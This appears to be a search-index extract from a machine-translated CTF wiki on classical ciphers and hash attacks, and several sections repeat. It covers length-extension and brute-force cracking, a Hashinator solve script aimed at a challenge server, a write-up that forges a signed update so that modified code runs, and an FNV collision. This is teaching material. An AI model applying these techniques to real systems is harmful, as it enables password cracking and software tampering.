\\_l(a+b, s)[c] Based on the observation of the second point 3, there is the following equivalence relation: t[a][b][c] \\Leftrightarrow s[a+b+c] t[a][b][c] \\Leftrightarrow s[a+b+c] We consider s as an encoding format, namely: encoding process s.find(x), decoding process s[x]. And directly replace the string it refers to by using the number of its encoded result, then the encryption process can be expressed by the following formula: - e = f + k1 +k2 e = f + k1 +k2 where e is ciphertext, f is plaintext, k1 and k2 are keys obtained by the copy method and of the same length as f, and addition is vector plus . So we only need to calculate the key by calculating k1+k2 and decrypt it. Decrypt the python script for this question: # exp2.py enc_str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_ {} ' dec_dic = { k : v for v , k in enumerate ( enc_str )} encrypt = 'POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9' flag_bg = 'SECCON{**************************}' Sim_key = [ dec_dic [ encrypt [ i ]] - dec_dic [ flag_bg [ i ]] for i in range ( 7 )] #crack the emulation key sim_key = sim_key + sim_key [:: - 1 ] Flag_ed = [ dec_dic [ v ] - sim_key [ k % 14 ] for k , v in enumerate ( encrypt )] #imitation key decryption flag_ed = '' . join ([ enc_str [ i % len ( enc_str )] for i in flag_ed ]) # \u89e3\u7801 print ( flag_ed ) Get the plain text as follows: $ python exp2.py SECCON { Welc0me_to_SECCON_CTF_2017 }","title":"2017 SECCON Vigenere3d"},{"location":"crypto/classical/summary/#the-disappearing-triple-password","text":"Ciphertext or sit kggd sit qkt ygxk ortfzoeqs wqlatzwqssl qfr zvg ortfzoeqs yggzwqssl. fgv oy ngx vqfz so-called hxz zitd or gft soft.piv dgfn lgsxzogfl qkt zitkt? zohl: hstqlt eiqfut is ygkd gy is fxdwtk ngx utz.zit hkgukqddtkl! Use quipquip to decrypt directly.","title":"The disappearing triple password"},{"location":"crypto/hash/attack/","text":"Hash Attack \u00b6 Common hash function attack methods are mainly Violent attack: does not depend on any algorithm details, only related to the length of the hash value; Birthday Attack: The structure and any algebraic weak nature of the hash function are not used, depending only on the length of the message digest, which is the length of the hash value. Meet-In-The-Middle: It is a variant of a birthday attack. Instead of comparing hash values, it compares intermediate variables. This type of attack is mainly used to attack Hash schemes with a packet chain structure. Password analysis: Depends on the design shortcomings of specific algorithms. violent attack \u00b6 HashCat tool can be said to be the best CPU and GPU-based cracking Hash software, the related links are as follows [HashCat official website] ( http://www.hashcat.net/hashcat/ ) [HashCat Simple to use] ( http://www.freebuf.com/sectool/112479.html ) hash length extension attacks \u00b6 Introduction \u00b6 The basic definition is as follows, from [Wikipedia] ( https://en.wikipedia.org/wiki/%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6 % 94% BB% E5% 87% BB). Hash Length Extension Attacks are pointers to certain cryptographic hash functions that allow additional information. This attack applies to all hash functions that take the H(key \u2225 message) construct in the case where the length of the message and the key is known . Algorithms based on the Merkle\u2013Damg\u00e5rd constructs such as MD5 and SHA-1 show vulnerabilities to such attacks. This type of hash function has the following characteristics The message padding method is similar. First, add a 1 after the message, then fill in a number of 0s until the total length is congruent with 448, and finally attach a 64-bit message length (before filling). Each link variable obtained will be used as the initial vector IV for the next execution of the hash function. In the last block, the corresponding link variable will be converted to a hash value. The following conditions should be met during a general attack. We know the length of the key, if you don't know, you need to burst it out. We can control the message of the message. We already know the hash value of a message containing a key. So we can get a pair (messge, x) to satisfy x = H (key \u2225 message) although we are not sure about the contents of the key. Attack principle \u00b6 Here we can assume that we know the hash value of hash(key+s), where s is known, then it will be filled when it is calculated. Then we can first get the key+s extended by key+s, ie now=key|s|padding Then if we attach a part of the information extra after the now, ie key|s|padding|extra When you go to calculate the hash value, The extra is filled until the condition is met. Calculate the link variable IV1 corresponding to now, and we already know the hash value of this part, and the algorithm that the link variable produces the hash value is reversible, so we can get the link variable. The hash algorithm is performed on the extra part according to the obtained link variable IV1, and the hash value is returned. So now that we know the hash value of the first part, and we also know the value of extra, then we can get the last hash value. And before we said that we can control the value of the message. So in fact, s, padding, extra, we can all control. So we can naturally find the corresponding (message, x) to satisfy x = hash (key | mesage). Examples \u00b6 It seems that most of them are inside the web, and I don't know much about the web. I will not give examples for the time being. Tools \u00b6 hashpump Please refer to the readme on github for how to use it. hash algorithm is incorrectly designed \u00b6 Some custom hash algorithms may be reversible. Hashinator \u00b6 The logic of the topic is very simple. Pick a password from a well-known password dictionary \"rockyou\" and use a variety of hash algorithms to randomly hash 32 rounds. We need to crack the original password from the final hash result. Analysis \u00b6 The hash algorithms used in the title are: md5 , sha1 , blake , scrypt . The key code is as follows: password = self . generate_password () # from rock_you.txt Salt = self . generate_salt ( password ) # related to the length of the password Hash_rounds = self . generate_rounds () # Generate the order in which the hash algorithm is executed password_hash = self . calculate_hash ( salt + password , hash_rounds ) The program first randomly extracts a password from rockyou.txt as the encrypted plaintext. Then generate a salt of length 128 - len(password) based on the length of the extracted password . Extract from the four hash algorithms listed above to form 32 rounds of hash operations. Calculate the last password_hash given to us based on the previously obtained password , salt . Obviously, we can't complete the problem by the inverse hash algorithm. We know all the possible plaintexts, first considering whether we can complete the exhaustion by constructing a rainbow table. But notice that in the generate_salt() function, the length combination of salt and password exceeds the length of 128 bytes and is annotated. msize = 128 # f-you hashcat :D So, can only helplessly give up. In that case, there is only one possibility, that is, the algorithm is reversible. Looking at the concrete implementation of the calculate_hash() function, you can find the following suspicious code: for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) final_hash = interim_salt + interim_hash Reorganize the information we know: 1. There are 32 rounds stored in hash_rounds, which is the hash function handle to be used in each round. 2. final_hash is the last hash result for us. 3. The contents of hash_rounds will also be printed to us after generation. 4. We want to get the values of interim_salt and interim_hash in the first round. 5. interim_salt and interim_hash are both 64bytes in length. A closer look at the calculations of interim_salt and interim_hash reveals that it is reversible. $$ interim_hash_1 = interim_hash_2 \\oplus hash_rounds i $$ In this line of code, we know interim\\_hash_1 interim\\_hash_1 and interim\\_salt_3 interim\\_salt_3 , so we can get the value of interim\\_hash_2 interim\\_hash_2 , and interim\\_hash_2 interim\\_hash_2 is the last round of interim_hash . By pushing back 32 times in this way, you can get the initial password and salt . The specific decryption script is: import import hashlib import socket import threading import socketserver import struct import time import threading # import pyscrypt from base64 import b64encode , b64decode from pwn import * def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) def main (): # io = socket.socket (family = socket.AF_INET) # io.connect ((&#39;47.88.216.38&#39;, 20013)) io = remote ( & #39;47 .88.216.38 &#39;, 20013) print ( io . recv ( 1000 )) ans_array = bytearray () while True : buf = io . recv ( 1 ) if buf : ans_array . extend ( buf ) if buf == b '!' : break password_hash_base64 = ans_array [ ans_array . find ( b \"b'\" ) + 2 : ans_array . find ( b \"' \\n \" )] password_hash = b64decode ( password_hash_base64 ) print ( 'password:' , password_hash ) method_bytes = ans_array [ ans_array . find ( b 'used: \\n ' ) + 6 : ans_array . find ( b ' \\n Your' ) ] methods = method_bytes . split ( b ' \\n ' ) methods = [ bytes ( x . strip ( b '- ' )) . decode () for x in methods ] print ( methods ) in_salt = password_hash [: 64 ] in_hash = password_hash [ 64 :] for pos , neg in zip ( methods , methods [:: - 1 ]): ''' interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash)) interim_hash = xor(interim_hash, hash_rounds[i](interim_salt)) ''' in_hash = xor ( in_hash , eval ( \" {} (in_salt)\" . format ( neg ))) in_salt = xor ( in_salt , eval ( \" {} (in_hash)\" . format ( pos ))) print ( in_hash , in_salt ) print ( in_hash [ - 20 :]) io . interactive () main () Original hash algorithm \u00b6 import import hashlib import socket import threading import socketserver import struct import time # import pyscrypt from base64 import b64encode def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) class HashHandler ( socketserver . BaseRequestHandler ): welcome_message = \"\"\" Welcome, young wanna-be Cracker, to the Hashinator. To prove your worthiness, you must display the power of your cracking skills. The test is easy: 1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms. 2. You crack the hash and send back the original password. As you already know the dictionary and won't need any fancy password rules, {} seconds should be plenty, right? Please wait while we generate your hash... \"\"\" hashes = [ md5 , sha , blake , scrypt ] timeout = 10 total_rounds = 32 def handle ( self ): self . request . sendall ( self . welcome_message . format ( self . timeout ) . encode ()) password = self . generate_password () # from rock_you.txt Salt = self . generate_salt ( password ) # related to the length of the password Hash_rounds = self . generate_rounds () # Generate the order in which the hash algorithm is executed password_hash = self . calculate_hash ( salt + password , hash_rounds ) self . generate_delay () self . request . sendall ( \"Challenge password hash: {} \\n \" . format ( b64encode ( password_hash )) . encode ()) self . request . sendall ( \"Rounds used: \\n \" . encode ()) test_rounds = [] for r in hash_rounds : test_rounds . append ( r ) for r in hash_rounds : self . request . sendall ( \"- {} \\n \" . format ( r . __name__ ) . encode ()) self . request . sendall ( \"Your time starts now! \\n \" . encode ()) self . request . settimeout ( self . timeout ) try : response = self . request . recv ( 1024 ) if response . strip () == password : self . request . sendall ( \"Congratulations! You are a true cracking master! \\n \" . encode ()) self . request . sendall ( \"Welcome to the club: {} \\n \" . format ( flag ) . encode ()) return except socket . timeout : pass self . request . sendall ( \"Your cracking skills are bad, and you should feel bad!\" . encode ()) def generate_password ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] lines = 14344391 # size of rockyou line = rand % lines password = \"\" f = open ( 'rockyou.txt' , 'rb' ) for i in range ( line ): password = f . readline () return password . strip () def generate_salt ( self , p ): msize = 128 # f-you hashcat :D salt_size = msize - len ( p ) return os . urandom ( salt_size ) def generate_rounds ( self ): rand = struct . unpack ( \"Q\" , os . urandom ( 8 ))[ 0 ] rounds = [] for i in range ( self . total_rounds ): rounds . append ( self . hashes [ rand % len ( self . hashes )]) rand = rand & gt ; & gt ; 2 return rounds def calculate_hash ( self , payload , hash_rounds ): interim_salt = payload [: 64 ] interim_hash = payload [ 64 :] for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) ''' interim_hash = xor( interim_hash, hash_rounds[i]( xor(interim_salt, hash_rounds[-1-i](interim_hash)) ) ) ''' final_hash = interim_salt + interim_hash return final_hash def generate_delay ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] time . sleep ( rand / 1000000000.0 ) class ThreadedTCPServer ( socketserver . ThreadingMixIn , socketserver . TCPServer ): allow_reuse_address = True PORT = 1337 HOST = '0.0.0.0' flag = \"\" with open ( \"flag.txt\" ) as f : flag = f . read () def main (): server = ThreadedTCPServer (( HOST , PORT ), HashHandler ) server_thread = threading . Thread ( target = server . serve_forever ) server_thread . start () server_thread . join () if __name__ == \"__main__\" : main ()","title":"Hash Attack"},{"location":"crypto/hash/attack/#hash-attack","text":"Common hash function attack methods are mainly Violent attack: does not depend on any algorithm details, only related to the length of the hash value; Birthday Attack: The structure and any algebraic weak nature of the hash function are not used, depending only on the length of the message digest, which is the length of the hash value. Meet-In-The-Middle: It is a variant of a birthday attack. Instead of comparing hash values, it compares intermediate variables. This type of attack is mainly used to attack Hash schemes with a packet chain structure. Password analysis: Depends on the design shortcomings of specific algorithms.","title":"Hash Attack"},{"location":"crypto/hash/attack/#violent-attack","text":"HashCat tool can be said to be the best CPU and GPU-based cracking Hash software, the related links are as follows [HashCat official website] ( http://www.hashcat.net/hashcat/ ) [HashCat Simple to use] ( http://www.freebuf.com/sectool/112479.html )","title":"violent attack"},{"location":"crypto/hash/attack/#hash-length-extension-attacks","text":"","title":"hash length extension attacks"},{"location":"crypto/hash/attack/#introduction","text":"The basic definition is as follows, from [Wikipedia] ( https://en.wikipedia.org/wiki/%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6 % 94% BB% E5% 87% BB). Hash Length Extension Attacks are pointers to certain cryptographic hash functions that allow additional information. This attack applies to all hash functions that take the H(key \u2225 message) construct in the case where the length of the message and the key is known . Algorithms based on the Merkle\u2013Damg\u00e5rd constructs such as MD5 and SHA-1 show vulnerabilities to such attacks. This type of hash function has the following characteristics The message padding method is similar. First, add a 1 after the message, then fill in a number of 0s until the total length is congruent with 448, and finally attach a 64-bit message length (before filling). Each link variable obtained will be used as the initial vector IV for the next execution of the hash function. In the last block, the corresponding link variable will be converted to a hash value. The following conditions should be met during a general attack. We know the length of the key, if you don't know, you need to burst it out. We can control the message of the message. We already know the hash value of a message containing a key. So we can get a pair (messge, x) to satisfy x = H (key \u2225 message) although we are not sure about the contents of the key.","title":"Introduction"},{"location":"crypto/hash/attack/#attack-principle","text":"Here we can assume that we know the hash value of hash(key+s), where s is known, then it will be filled when it is calculated. Then we can first get the key+s extended by key+s, ie now=key|s|padding Then if we attach a part of the information extra after the now, ie key|s|padding|extra When you go to calculate the hash value, The extra is filled until the condition is met. Calculate the link variable IV1 corresponding to now, and we already know the hash value of this part, and the algorithm that the link variable produces the hash value is reversible, so we can get the link variable. The hash algorithm is performed on the extra part according to the obtained link variable IV1, and the hash value is returned. So now that we know the hash value of the first part, and we also know the value of extra, then we can get the last hash value. And before we said that we can control the value of the message. So in fact, s, padding, extra, we can all control. So we can naturally find the corresponding (message, x) to satisfy x = hash (key | mesage).","title":"Attack principle"},{"location":"crypto/hash/attack/#examples","text":"It seems that most of them are inside the web, and I don't know much about the web. I will not give examples for the time being.","title":"Examples"},{"location":"crypto/hash/attack/#tools","text":"hashpump Please refer to the readme on github for how to use it.","title":"Tools"},{"location":"crypto/hash/attack/#hash-algorithm-is-incorrectly-designed","text":"Some custom hash algorithms may be reversible.","title":"hash algorithm is incorrectly designed"},{"location":"crypto/hash/attack/#hashinator","text":"The logic of the topic is very simple. Pick a password from a well-known password dictionary \"rockyou\" and use a variety of hash algorithms to randomly hash 32 rounds. We need to crack the original password from the final hash result.","title":"Hashinator"},{"location":"crypto/hash/attack/#analysis","text":"The hash algorithms used in the title are: md5 , sha1 , blake , scrypt . The key code is as follows: password = self . generate_password () # from rock_you.txt Salt = self . generate_salt ( password ) # related to the length of the password Hash_rounds = self . generate_rounds () # Generate the order in which the hash algorithm is executed password_hash = self . calculate_hash ( salt + password , hash_rounds ) The program first randomly extracts a password from rockyou.txt as the encrypted plaintext. Then generate a salt of length 128 - len(password) based on the length of the extracted password . Extract from the four hash algorithms listed above to form 32 rounds of hash operations. Calculate the last password_hash given to us based on the previously obtained password , salt . Obviously, we can't complete the problem by the inverse hash algorithm. We know all the possible plaintexts, first considering whether we can complete the exhaustion by constructing a rainbow table. But notice that in the generate_salt() function, the length combination of salt and password exceeds the length of 128 bytes and is annotated. msize = 128 # f-you hashcat :D So, can only helplessly give up. In that case, there is only one possibility, that is, the algorithm is reversible. Looking at the concrete implementation of the calculate_hash() function, you can find the following suspicious code: for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) final_hash = interim_salt + interim_hash Reorganize the information we know: 1. There are 32 rounds stored in hash_rounds, which is the hash function handle to be used in each round. 2. final_hash is the last hash result for us. 3. The contents of hash_rounds will also be printed to us after generation. 4. We want to get the values of interim_salt and interim_hash in the first round. 5. interim_salt and interim_hash are both 64bytes in length. A closer look at the calculations of interim_salt and interim_hash reveals that it is reversible. $$ interim_hash_1 = interim_hash_2 \\oplus hash_rounds i $$ In this line of code, we know interim\\_hash_1 interim\\_hash_1 and interim\\_salt_3 interim\\_salt_3 , so we can get the value of interim\\_hash_2 interim\\_hash_2 , and interim\\_hash_2 interim\\_hash_2 is the last round of interim_hash . By pushing back 32 times in this way, you can get the initial password and salt . The specific decryption script is: import import hashlib import socket import threading import socketserver import struct import time import threading # import pyscrypt from base64 import b64encode , b64decode from pwn import * def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) def main (): # io = socket.socket (family = socket.AF_INET) # io.connect ((&#39;47.88.216.38&#39;, 20013)) io = remote ( & #39;47 .88.216.38 &#39;, 20013) print ( io . recv ( 1000 )) ans_array = bytearray () while True : buf = io . recv ( 1 ) if buf : ans_array . extend ( buf ) if buf == b '!' : break password_hash_base64 = ans_array [ ans_array . find ( b \"b'\" ) + 2 : ans_array . find ( b \"' \\n \" )] password_hash = b64decode ( password_hash_base64 ) print ( 'password:' , password_hash ) method_bytes = ans_array [ ans_array . find ( b 'used: \\n ' ) + 6 : ans_array . find ( b ' \\n Your' ) ] methods = method_bytes . split ( b ' \\n ' ) methods = [ bytes ( x . strip ( b '- ' )) . decode () for x in methods ] print ( methods ) in_salt = password_hash [: 64 ] in_hash = password_hash [ 64 :] for pos , neg in zip ( methods , methods [:: - 1 ]): ''' interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash)) interim_hash = xor(interim_hash, hash_rounds[i](interim_salt)) ''' in_hash = xor ( in_hash , eval ( \" {} (in_salt)\" . format ( neg ))) in_salt = xor ( in_salt , eval ( \" {} (in_hash)\" . format ( pos ))) print ( in_hash , in_salt ) print ( in_hash [ - 20 :]) io . interactive () main ()","title":"Analysis"},{"location":"crypto/hash/attack/#original-hash-algorithm","text":"import import hashlib import socket import threading import socketserver import struct import time # import pyscrypt from base64 import b64encode def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) class HashHandler ( socketserver . BaseRequestHandler ): welcome_message = \"\"\" Welcome, young wanna-be Cracker, to the Hashinator. To prove your worthiness, you must display the power of your cracking skills. The test is easy: 1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms. 2. You crack the hash and send back the original password. As you already know the dictionary and won't need any fancy password rules, {} seconds should be plenty, right? Please wait while we generate your hash... \"\"\" hashes = [ md5 , sha , blake , scrypt ] timeout = 10 total_rounds = 32 def handle ( self ): self . request . sendall ( self . welcome_message . format ( self . timeout ) . encode ()) password = self . generate_password () # from rock_you.txt Salt = self . generate_salt ( password ) # related to the length of the password Hash_rounds = self . generate_rounds () # Generate the order in which the hash algorithm is executed password_hash = self . calculate_hash ( salt + password , hash_rounds ) self . generate_delay () self . request . sendall ( \"Challenge password hash: {} \\n \" . format ( b64encode ( password_hash )) . encode ()) self . request . sendall ( \"Rounds used: \\n \" . encode ()) test_rounds = [] for r in hash_rounds : test_rounds . append ( r ) for r in hash_rounds : self . request . sendall ( \"- {} \\n \" . format ( r . __name__ ) . encode ()) self . request . sendall ( \"Your time starts now! \\n \" . encode ()) self . request . settimeout ( self . timeout ) try : response = self . request . recv ( 1024 ) if response . strip () == password : self . request . sendall ( \"Congratulations! You are a true cracking master! \\n \" . encode ()) self . request . sendall ( \"Welcome to the club: {} \\n \" . format ( flag ) . encode ()) return except socket . timeout : pass self . request . sendall ( \"Your cracking skills are bad, and you should feel bad!\" . encode ()) def generate_password ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] lines = 14344391 # size of rockyou line = rand % lines password = \"\" f = open ( 'rockyou.txt' , 'rb' ) for i in range ( line ): password = f . readline () return password . strip () def generate_salt ( self , p ): msize = 128 # f-you hashcat :D salt_size = msize - len ( p ) return os . urandom ( salt_size ) def generate_rounds ( self ): rand = struct . unpack ( \"Q\" , os . urandom ( 8 ))[ 0 ] rounds = [] for i in range ( self . total_rounds ): rounds . append ( self . hashes [ rand % len ( self . hashes )]) rand = rand & gt ; & gt ; 2 return rounds def calculate_hash ( self , payload , hash_rounds ): interim_salt = payload [: 64 ] interim_hash = payload [ 64 :] for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) ''' interim_hash = xor( interim_hash, hash_rounds[i]( xor(interim_salt, hash_rounds[-1-i](interim_hash)) ) ) ''' final_hash = interim_salt + interim_hash return final_hash def generate_delay ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] time . sleep ( rand / 1000000000.0 ) class ThreadedTCPServer ( socketserver . ThreadingMixIn , socketserver . TCPServer ): allow_reuse_address = True PORT = 1337 HOST = '0.0.0.0' flag = \"\" with open ( \"flag.txt\" ) as f : flag = f . read () def main (): server = ThreadedTCPServer (( HOST , PORT ), HashHandler ) server_thread = threading . Thread ( target = server . serve_forever ) server_thread . start () server_thread . join () if __name__ == \"__main__\" : main ()","title":"Original hash algorithm"},{"location":"crypto/hash/complex/","text":"\u7efc\u5408 \u00b6 2017 34c3 Software_update \u00b6 As you can see, the general meaning of the program is to upload a zip archive and then verify the signature of the files in the signed_data directory. Among them, the final verification method is to perform a sha256 hash on each file, and then XOR X is sent as input to rsa for signature. If verified, the corresponding pre-copy.py and post-copy.py files will be executed. The natural idea is that we modify the pre-copy.py or post-copy.py file so that it can read the flag and then bypass the signature again. There are two main ideas According to the given public key file to obtain the corresponding private key, and then modify the file to forge the signature, and then look at the public key file is almost unbreakable, so this can basically give up. After modifying the corresponding file, use the XOR feature to make its hash value the same as the original **, thus bypassing the signature detection. That is, the signed_data directory contains multiple files, so that the hash values of these files are finally XORed to offset the difference in hash values caused by modifying the pre-copy.py or post-copy.py files. Here, we choose the second method, here we choose to modify the pre-copy.py file, the specific ideas are as follows Calculate the original hash value of pre-copy.py. Modify the pre-copy.py file so that it can read the flag. At the same time, calculate the new hash value. XOR the two and find the difference or delta. Look for a series of files whose X-values are XORed exactly as delta. The key step is the third step, but in fact this file can be seen as a linear combination problem, that is, looking for several 256-dimensional 01 vectors to make the XOR value delta. and $$ (F={0,1},F^{256},\\oplus ,\\cdot) $$ Is a 256-dimensional vector space. If we can find a basis for the vector space, then we can find the required vector for any given value in the space. We can use sage to assist us, as follows # generage the base of <{0,1},F^256,xor,*> def gen_gf2_256_base (): v = VectorSpace ( GF ( 2 ), 256 ) tmphash = compute_file_hash ( \"0.py\" , \"\" ) tmphash_bin = hash2bin ( tmphash ) base = [ tmphash_bin ] filelist = [ '0.py' ] print base s = v . subspace ( base ) dim = s . dimension () cnt = 1 while dim != 256 : tmpfile = str ( cnt ) + \".py\" tmphash = compute_file_hash ( tmpfile , \"\" ) tmphash_bin = hash2bin ( tmphash ) old_dim = dim s = v . subspace ( base + [ tmphash_bin ]) dim = s . dimension () if dim > old_dim : base += [ tmphash_bin ] filelist . append ( tmpfile ) print ( \"dimension \" + str ( s . dimension ())) cnt += 1 print ( cnt ) m = matrix ( GF ( 2 ), 256 , 256 , base ) m = m . transpose () return m , filelist For more detailed answers, please refer to exp.py . Here I am modifying the pre-copy multi-output !!!!come here!!!! word, as follows \u279c software_update git: ( master ) python3 installer.py now.zip Preparing to copy data... !!!!come here!!!! Software update installed successfully. references \u00b6 https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py","title":"Challenge Examples"},{"location":"crypto/hash/complex/#_1","text":"","title":"\u7efc\u5408"},{"location":"crypto/hash/complex/#2017-34c3-software_update","text":"As you can see, the general meaning of the program is to upload a zip archive and then verify the signature of the files in the signed_data directory. Among them, the final verification method is to perform a sha256 hash on each file, and then XOR X is sent as input to rsa for signature. If verified, the corresponding pre-copy.py and post-copy.py files will be executed. The natural idea is that we modify the pre-copy.py or post-copy.py file so that it can read the flag and then bypass the signature again. There are two main ideas According to the given public key file to obtain the corresponding private key, and then modify the file to forge the signature, and then look at the public key file is almost unbreakable, so this can basically give up. After modifying the corresponding file, use the XOR feature to make its hash value the same as the original **, thus bypassing the signature detection. That is, the signed_data directory contains multiple files, so that the hash values of these files are finally XORed to offset the difference in hash values caused by modifying the pre-copy.py or post-copy.py files. Here, we choose the second method, here we choose to modify the pre-copy.py file, the specific ideas are as follows Calculate the original hash value of pre-copy.py. Modify the pre-copy.py file so that it can read the flag. At the same time, calculate the new hash value. XOR the two and find the difference or delta. Look for a series of files whose X-values are XORed exactly as delta. The key step is the third step, but in fact this file can be seen as a linear combination problem, that is, looking for several 256-dimensional 01 vectors to make the XOR value delta. and $$ (F={0,1},F^{256},\\oplus ,\\cdot) $$ Is a 256-dimensional vector space. If we can find a basis for the vector space, then we can find the required vector for any given value in the space. We can use sage to assist us, as follows # generage the base of <{0,1},F^256,xor,*> def gen_gf2_256_base (): v = VectorSpace ( GF ( 2 ), 256 ) tmphash = compute_file_hash ( \"0.py\" , \"\" ) tmphash_bin = hash2bin ( tmphash ) base = [ tmphash_bin ] filelist = [ '0.py' ] print base s = v . subspace ( base ) dim = s . dimension () cnt = 1 while dim != 256 : tmpfile = str ( cnt ) + \".py\" tmphash = compute_file_hash ( tmpfile , \"\" ) tmphash_bin = hash2bin ( tmphash ) old_dim = dim s = v . subspace ( base + [ tmphash_bin ]) dim = s . dimension () if dim > old_dim : base += [ tmphash_bin ] filelist . append ( tmpfile ) print ( \"dimension \" + str ( s . dimension ())) cnt += 1 print ( cnt ) m = matrix ( GF ( 2 ), 256 , 256 , base ) m = m . transpose () return m , filelist For more detailed answers, please refer to exp.py . Here I am modifying the pre-copy multi-output !!!!come here!!!! word, as follows \u279c software_update git: ( master ) python3 installer.py now.zip Preparing to copy data... !!!!come here!!!! Software update installed successfully.","title":"2017 34c3 Software_update"},{"location":"crypto/hash/complex/#references","text":"https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py","title":"references"},{"location":"crypto/hash/fnv/","text":"Fowler\u2013Noll\u2013Vo hash function \u00b6 See https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function for details. 2018 \u7f51\u9f0e\u676fashcoll \u00b6 In fact, this question was copied from NSU Crypto, https://nsucrypto.nsu.ru/archive/2017/problems_solution , the specific wp before hellman also wrote, https://gist.github.com/hellman/9bf8376cd04e7a8dd2ec7be1947261e9 . Simply look at the topic h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399 # 2**168 + 355 g = 374144419156711147060143317175368453031918731002211 L def shitty_hash ( msg ): h = h0 msg = map ( ord , msg ) for i in msg : h = ( h + i ) * g # This line is just to screw you up :)) h = h & amp ; 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff return h - 0xe6168647f636 The topic hopes that we give two messages with the same hash value. If we expand the function, then hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256} hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256} Suppose the hash values of the two messages are the same. $ h_0g ^ n + x_1g ^ n + x_2g_ {n-1} + ... + x_ng equiv h_0g ^ n + y_1g ^ n + y_2g_ {n-1} + ... + y_ng bmod 2 ^ {256} $ and then $ (x_1-y_1) g ^ {n-1} + (x_2-y_2) g ^ {n-2} + ... + (x_n-y_n) g ^ 0 equiv 0 bmod 2 ^ {256} $ That is, we only need to find an n-dimensional vector z_i=x_i-y_i z_i=x_i-y_i , which satisfies the above equation, we can further convert it into $ z_1g ^ {n-1} + z_2g ^ {n-2} + ... + z_ng ^ 0-k * 2 ^ {256} = 0 $ That is, a set of vectors is found to satisfy the above formula. This can be thought of as a simple case of the second example in LLL Paper (see the Lattice Question section). Then we can quickly construct the matrix as follows A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & Kg^{n-1} \\\\ 0 & 1 & 0 & \\cdots & 0 & Kg^{n-2} \\\\ 0 & 0 & 1 & \\cdots & 0 & Kg^{n-3} \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & K*mod 